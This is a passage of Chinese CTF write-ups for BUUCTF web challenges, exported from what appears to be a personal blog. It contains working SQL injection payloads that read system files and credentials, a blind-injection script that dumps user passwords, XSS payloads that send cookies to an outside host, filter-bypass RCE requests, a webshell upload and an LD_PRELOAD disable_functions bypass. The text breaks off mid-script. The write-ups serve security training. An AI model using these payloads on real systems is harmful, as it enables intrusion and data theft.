    <content type="html"><![CDATA[<h2 id="‘-’"><a href="#‘-’" class="headerlink" title="‘__’"></a>‘__’</h2><p>留言那里存在XSS，BUU的XSS平台没法注册，就没试’()’</p><p>二次注入      </p><p><img src="https://img11.360buyimg.com/ddimg/jfs/t1/174863/29/3351/8503/6072da0aEe2e9591e/202fcd59c2670f49.png" alt="06.png"><br>提示了账号和密码，一般后面是三位数字，爆破是666<br><img src="https://ftp.bmp.ovh/imgs/2021/04/04a05effe6890640.png"><br><code>write_do.php</code><br>看WP是git泄露<br>Githack一下下载下来<code>write_do.php</code>  ，但是是残缺的，git log历史commit里也没<code>add write_do.php</code>??      </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token double-quoted-string string">"mysql.php"</span><span class="token punctuation">;</span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'login'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token single-quoted-string string">'yes'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: ./login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'do'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">case</span> <span class="token single-quoted-string string">'write'</span><span class="token punctuation">:</span>     <span class="token shell-comment comment">##发帖</span>    <span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$title</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"insert into board            set category = '<span class="token interpolation"><span class="token variable">$category</span></span>',                title = '<span class="token interpolation"><span class="token variable">$title</span></span>',                content = '<span class="token interpolation"><span class="token variable">$content</span></span>'"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token single-quoted-string string">'comment'</span><span class="token punctuation">:</span>   <span class="token shell-comment comment">##留言</span>    <span class="token variable">$bo_id</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'bo_id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"select category from board where id='<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token function">mysql_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$category</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'category'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"insert into comment            set category = '<span class="token interpolation"><span class="token variable">$category</span></span>',                content = '<span class="token interpolation"><span class="token variable">$content</span></span>',                bo_id = '<span class="token interpolation"><span class="token variable">$bo_id</span></span>'"</span><span class="token punctuation">;</span>    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: ./comment.php?id=<span class="token interpolation"><span class="token variable">$bo_id</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">default</span><span class="token punctuation">:</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">header</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Location: ./index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre></code></pre><p>虽然有addslashes函数，但是，数据库查询时会自动过滤调斜线的<br><img src="https://ftp.bmp.ovh/imgs/2021/04/4d8c1aa58308f665.png">     </p><pre><code>$sql = &quot;insert into comment        set category = &#39;$category&#39;,            content = &#39;$content&#39;,            bo_id = &#39;$bo_id&#39;&quot;;      </code></pre><p><code>category=&#39;,content=database(),/*     </code><br>留言输入<code>content=*/#</code><br>就成了      </p><pre><code>$sql = &quot;insert into comment        set category = &#39;&#39;,content=database(),/*&#39;,            content = &#39;*/#&#39;,            bo_id = &#39;$bo_id&#39;&quot;;      </code></pre><p>就可以查询库了 —-<code>ctf</code><br>然后查表啥的，但查不出来       </p><p><code>load_file</code>        </p><p><code>    &#39;,content=load_file(&#39;/etc/passwd&#39;),/*</code><br><img src="https://ftp.bmp.ovh/imgs/2021/04/f60314c154735390.png">       </p><p><code>&#39;,content=load_file(&#39;/home/www/.bash_history&#39;),/*</code><br><img src="https://ftp.bmp.ovh/imgs/2021/04/4ec8c167bc9d6949.png">    </p><p>虽然被删了，但<code>/tmp/html</code>中还有<br><code>&#39;,content=load_file(&#39;/tmp/html/.DS_Store&#39;),/*</code>会乱码，加hex<code>&#39;,content=hex(load_file(&#39;/tmp/html/.DS_Store&#39;)),/*</code><br><img src="https://ftp.bmp.ovh/imgs/2021/04/430404dd20585acc.png"> </p><p><code>&#39;,content=hex(load_file(&#39;/var/www/html/flag_8946e1ff1ee3e40f.php&#39;)),/*</code><br>解码得到flag     </p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CyberPunk</title>
    <link href="/2021/04/04/BUU65/"/>
    <url>/2021/04/04/BUU65/</url>
    
    <content type="html"><![CDATA[<h2 id="‘-’"><a href="#‘-’" class="headerlink" title="‘__’"></a>‘__’</h2><p><img src="https://ftp.bmp.ovh/imgs/2021/04/e4c5412ad0e75377.png"><br>看下源码，有提示：<code>&lt;!--?file=?--&gt;</code>     </p><p>用伪协议读下文件<br><code>index.php</code><br><code>change.php</code><br><code>config.php</code><br><code>search.php</code><br><code>delete.php</code>        </p><p><code>$pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;</code><br>name和phone 都过滤了好多<br>address只有一个addslashes转义函数<br>修改地址那里没有过滤，可以在此进行SQL注入，第一次修改为SQL语句，再次修改，刚才修改的SQL语句就被查询执行了<br>回显只有<code>订单修改成功</code><br>可以报错注入<br>payload：<code>1&#39; where user_id=updatexml(1,concat(0x7e,(select user()),0x7e),1)#</code><br>不过这道题flag没在数据库中，要用<code>load_file</code>读取文件<br><code>select load_file(&#39;/flag.txt&#39;)</code><br><code>flag.txt</code>是猜的<br>updatexml每次只能回显32位<br>可以substr或者right、left       </p><p><img src="https://ftp.bmp.ovh/imgs/2021/04/167b92bcd92a0069.png"> </p><h2 id="芝士·"><a href="#芝士·" class="headerlink" title="芝士·"></a>芝士·</h2><p><code>select load_file(&#39;/etc/password&#39;)</code>    </p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Can You Guess It?</title>
    <link href="/2021/04/03/BUU64/"/>
    <url>/2021/04/03/BUU64/</url>
    
    <content type="html"><![CDATA[<h2 id="‘0’"><a href="#‘0’" class="headerlink" title="‘0’"></a>‘0’</h2><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token single-quoted-string string">'config.php'</span><span class="token punctuation">;</span> <span class="token comment">// FLAG is defined in config.php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/config\.php\/*$/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"I don't know what you are thinking, but I won't let you read it :)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'PHP_SELF'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre></code></pre><p><code>$_SERVER[&#39;&#39;PHP_SELF&#39;&#39;]</code>—–&gt;获取网页地址<br>下面的是个幌子<br><a href="https://bugs.php.net/bug.php?id=62119">basename漏洞</a>—–&gt;会去掉文件名开头的非ASCII值<br>ascii的范围是<code>0~255</code>，但<code>128~255</code>没在表中       </p><p>payload：<code>/index.php/config.php/%ff?source</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Easyweb</title>
    <link href="/2021/04/02/BUU63/"/>
    <url>/2021/04/02/BUU63/</url>
    
    <content type="html"><![CDATA[<h2 id="‘-‘"><a href="#‘-‘" class="headerlink" title="‘ - ‘"></a>‘ - ‘</h2><p><img src="https://ftp.bmp.ovh/imgs/2021/04/ee8f89b00a61ccff.png"><br><code>robots.txt</code>    </p><pre><code>User-agent: *Disallow: *.php.bak        </code></pre><p>有<code>image.php.bak</code>       </p><pre><code>```php&lt;﻿?phpinclude &quot;config.php&quot;;$id=isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;;$path=isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;;$id=addslashes($id);$path=addslashes($path);$id=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$id);$path=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#39;&quot;,&quot;&#39;&quot;),&quot;&quot;,$path);$result=mysqli_query($con,&quot;select * from images where id=&#39;&#123;$id&#125;&#39; or path=&#39;&#123;$path&#125;&#39;&quot;);$row=mysqli_fetch_array($result,MYSQLI_ASSOC);$path=&quot;./&quot; . $row[&quot;path&quot;];header(&quot;Content-Type: image/jpeg&quot;);readfile($path);      ```     </code></pre><p><code>addslashes</code>函数</p><pre><code>返回字符串，该字符串为了数据库查询语句等的需要在某些字符前加上了反斜线。这些字符是单引号（&#39;）、双引号（&quot;）、反斜线（\）与 NUL（NULL 字符）。      </code></pre><p><code>image.php?id=1</code>sql注入     </p><p>绕过<code>id=\0</code>        </p><p><code>\0</code>经过addslashes函数后是<code>\\0</code>，然后<code>\0</code>替换围殴空格，只剩下了<code>\</code>，从而转义<code>&#39;</code>         </p><pre><code>```pythonimport requestsimport timeurl=&#39;http://984ea44f-1a99-475f-877c-e0285554e586.node3.buuoj.cn/image.php?id=\\0&amp;path= or &#39;flag=&#39;&#39;st=&#39;JFIF&#39;           JFIF是那个图片for j in range(1,100):    s=32    l=128    mid=(s+l)//2    while(s&lt;l):        time.sleep(0.1)        #payload=&quot;ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125; %23&quot;.format(j,mid)        #payload=&quot;ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125; %23&quot;.format(j,mid)        #payload=&quot;ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),&#123;&#125;,1))&gt;&#123;&#125; %23&quot;.format(j,mid)        payload=&quot;ascii(substr((select group_concat(username,0x2626,password) from users),&#123;&#125;,1))&gt;&#123;&#125; %23&quot;.format(j,mid)        url_new=url+payload        r=requests.get(url=url_new)        if st  in r.text:            s=mid+1        else:            l=mid        mid=(s+l)//2    if(mid==32 or mid==132):        break    flag=flag+chr(mid)    print(flag)```     </code></pre><p>登录后是传文件，需要在文件名写一句话，用短标签绕过对<code>php/i</code>的过滤<br>然后出现log路径，但我用蚁剑连不上，？？？        </p><p>就这吧，记一次文件名上传一句话木马        </p><p><a href="http://t.zoukankan.com/wangtanzhi-p-12253918.html">http://t.zoukankan.com/wangtanzhi-p-12253918.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BJDCTF 2nd Xss之光</title>
    <link href="/2021/04/01/BUU62/"/>
    <url>/2021/04/01/BUU62/</url>
    
    <content type="html"><![CDATA[<h2 id="‘-‘-‘"><a href="#‘-‘-‘" class="headerlink" title="‘-‘-‘"></a>‘-‘-‘</h2><p><img src="https://ftp.bmp.ovh/imgs/2021/04/6b7c495f5410b55c.png"><br>打开就个这<br>其他什么也没<br>dirsearch扫的话会429，加-s还是会429？？？<br>看了WP是git泄露<br>githack一下<br><img src="https://ftp.bmp.ovh/imgs/2021/04/92d01a33b6c1a59a.png"><br><img src="https://ftp.bmp.ovh/imgs/2021/04/15257587e78dc396.png"><br>就这？？<br>没类？？     </p><p>用原生类—<a href="https://www.php.net/manual/zh/class.exception.php">Exception</a>—所有异常的基类     </p><p>然后弹cookie    </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"&lt;script>alert(document.cookie)&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> </code></pre></code></pre><p><code>window.open</code>—–&gt;打开新窗口     </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"&lt;script>window.open('http://cfde3d9f-8b17-4812-8626-a978cefef14d.node3.buuoj.cn/'+document.cookie);&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> </code></pre></code></pre><p><code>window.location.href=&#39;url&#39;</code>—-&gt;实现恶意跳转       </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Exception</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"&lt;script>window.location.href='http://cfde3d9f-8b17-4812-8626-a978cefef14d.node3.buuoj.cn/'+document.cookie&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> </code></pre></code></pre><h2 id="芝士·"><a href="#芝士·" class="headerlink" title="芝士·"></a>芝士·</h2><p><a href="https://blog.csdn.net/qq_45521281/article/details/105812056">利用php的原生类进行XSS</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>FBCTF2019 RCEService</title>
    <link href="/2021/03/31/BUU61/"/>
    <url>/2021/03/31/BUU61/</url>
    
    <content type="html"><![CDATA[<h2 id="‘o’-‘o’"><a href="#‘o’-‘o’" class="headerlink" title="‘o’  ‘o’"></a>‘o’  ‘o’</h2><p><img src="https://ftp.bmp.ovh/imgs/2021/03/4d9c90c2ba9a44e4.png"><br>命令执行<br>ls一下，用JSON格式：<code>&#123;&quot;cmd&quot;:&quot;ls&quot;&#125;</code><br>得到一个<code>index.php</code><br>除此之外，输入其他命令会报错，过滤了    </p><p>看WP都直接给出的源码，也不知道哪来的<code>‘？’</code>       </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">putenv</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'PATH=/home/rceservice/jail'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token variable">$json</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token single-quoted-string string">'Hacking attempt detected&lt;br/>&lt;br/>'</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/'</span><span class="token punctuation">,</span> <span class="token variable">$json</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token single-quoted-string string">'Hacking attempt detected&lt;br/>&lt;br/>'</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token single-quoted-string string">'Attempting to run command:&lt;br/>'</span><span class="token punctuation">;</span>    <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">,</span> <span class="token boolean constant">true</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$cmd</span> <span class="token operator">!==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">echo</span> <span class="token single-quoted-string string">'Invalid input'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token single-quoted-string string">'&lt;br/>&lt;br/>'</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre></code></pre><p><code>putenv — 设置环境变量的值</code><br>设置了环境变量，但可以ls，是因为路径下有ls的二进制文件<br><code>%0a</code>绕过<code>preg_match</code><br><code>?cmd=&#123;%0A&quot;cmd&quot;%3A&quot;ls+%2Fhome%2Frceservice&quot;%0A&#125;</code>直接在URL中输入，表单提交的话<code>%0a</code>会被再次编码，出不来<br><img src="https://ftp.bmp.ovh/imgs/2021/03/67a2d29f30e10e8a.png"><br>cat没法用，可以用绝对路径<code>/bin/cat</code><br><code>?cmd=&#123;%0A&quot;cmd&quot;%3A&quot;/bin/cat+%2Fhome%2Frceservice/flag&quot;%0A&#125;</code>          </p><p><strong>回溯绕过</strong>     </p><p><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html#0x03-phppcrebacktrack_limit">P神：PHP利用PCRE回溯次数限制绕过某些安全限制</a>        </p><pre><code><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestspayload <span class="token operator">=</span> <span class="token string">'&#123;"cmd":"/bin/cat /home/rceservice/flag","test":"'</span> <span class="token operator">+</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">1000000</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'"&#125;'</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"http://0c2928b7-761f-4fac-be5e-291db6ec5085.node3.buuoj.cn/"</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"cmd"</span><span class="token punctuation">:</span>payload<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment">#print(payload)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre></code></pre>]]></content>
    
    
    
    <tags>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>极客大挑战 2019 RCE ME</title>
    <link href="/2021/03/30/BUU60/"/>
    <url>/2021/03/30/BUU60/</url>
    
    <content type="html"><![CDATA[<h2 id="好难"><a href="#好难" class="headerlink" title="好难"></a>好难</h2><p>代码审计       </p><pre><code><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$code</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"This is too Long."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                <span class="token punctuation">&#125;</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/[A-Za-z0-9]+/"</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                                        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"NO."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                                <span class="token punctuation">&#125;</span>                    @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// </span><span class="token delimiter important">?></span></span></code></pre></code></pre><p>匹配字母和数字，长度限制        </p><p>可以用url编码取反<br>看一下<code>phpinfo()</code><br><code>?code=(~%8F%97%8F%96%91%99%90)();</code><br><code>diable_function</code><br><img src="https://ftp.bmp.ovh/imgs/2021/03/af56694c62004458.png"><br>然后可以构造一个shell连蚁剑<br><img src="https://ftp.bmp.ovh/imgs/2021/03/867af17595321212.png"><br><code>?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9E%9E%A2%D6);</code><br><img src="https://ftp.bmp.ovh/imgs/2021/03/3c8a2ebff12bd606.png"><br>根目录下发现flag，但打开什么也没有，还有个readflag，应该要通过这个得到flag          </p><p>绕过<code>disable_function</code><br><a href="https://codechina.csdn.net/mirrors/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD?utm_source=csdn_github_accelerator">EXP</a><br>将两个脚本上传到<code>/var/tmp</code><img src="https://ftp.bmp.ovh/imgs/2021/03/867f27890d683cc6.png"><br>再构造payload<br>这里构造用的异或，我试着还用取反，但没成功？？</p><p><img src="https://ftp.bmp.ovh/imgs/2021/03/63bcafadb06aa2b4.png"><br><code>?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=include(%27/var/tmp/bypass_disablefunc.php%27)&amp;cmd=/readflag&amp;outpath=/tmp/tmpfile&amp;sopath=/var/tmp/bypass_disablefunc_x64.so</code><br><img src="https://ftp.bmp.ovh/imgs/2021/03/1fd484dc9735a262.png"> </p><p>还有就蚁剑的应用市场有一个绕过disable_function的插件，但我电脑上的蚁剑打不开应用市场？？？？      </p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p><strong><code>assert(eval($_POST[aa]))</code></strong><br><strong><code>$&#123;_GET&#125;[_]($&#123;_GET&#125;&#123;__&#125;)</code></strong>    </p><p><a href="https://blog.csdn.net/mochu7777777/article/details/104631142">大佬异或的脚本</a>       </p><pre><code><pre class="language-python" data-language="python"><code class="language-python">payload <span class="token operator">=</span> <span class="token string">"_GET"</span>strlist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token 